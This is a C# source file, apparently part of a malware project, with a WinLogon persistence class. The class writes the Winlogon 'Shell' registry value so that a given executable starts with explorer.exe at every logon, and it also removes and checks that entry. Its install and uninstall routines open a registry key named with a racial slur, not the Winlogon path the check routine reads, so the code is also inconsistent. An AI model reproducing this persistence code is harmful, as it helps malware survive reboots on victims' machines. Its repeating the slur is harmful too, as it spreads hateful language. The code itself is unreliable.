using Microsoft.Win32;

namespace Main.Source.Utilities.Persistence
{
    public class WinLogon
    {
        private const string LogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

        public static void Install(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
            if (logon == null)
            {
                Logger.Warn("WinLogon.Install: failed to open run");
            }
            else
            {
                try
                {
                    logon.SetValue("Shell", $"explorer.exe, \"{path}\" {ConfigMisc.LAUNCH_KEY}");
                }
                catch
                {
                    Logger.Warn($"WinLogon.Install: failed to install");
                }
            }
        }

        public static void Uninstall()
        {
            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
            if (logon == null)
            {
                Logger.Warn("WinLogon.Uninstall: failed to open run");
            }
            else
            {
                try
                {
                    logon.SetValue("Shell", "explorer.exe");
                }
                catch
                {
                    Logger.Warn($"WinLogon.Uninstall: failed to uninstall");
                }
            }
        }

        public static WinLogonStatus Check(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, false);
            if (logon == null)
            {
                return WinLogonStatus.FailedOpenWinLogonKey;
            }

            var shell = logon.GetValue("Shell") as string;
            if (shell == null)
            {
                return WinLogonStatus.FailedFindWinLogonValue;
            }

            if (shell == "explorer.exe")
            {
                return WinLogonStatus.OnlyHasDefaultValue;
            }

            if (!shell.Contains(path))
            {
                return WinLogonStatus.DoesNotContainPath;
            }

            return WinLogonStatus.AllowedToStart;
        }
    }
}
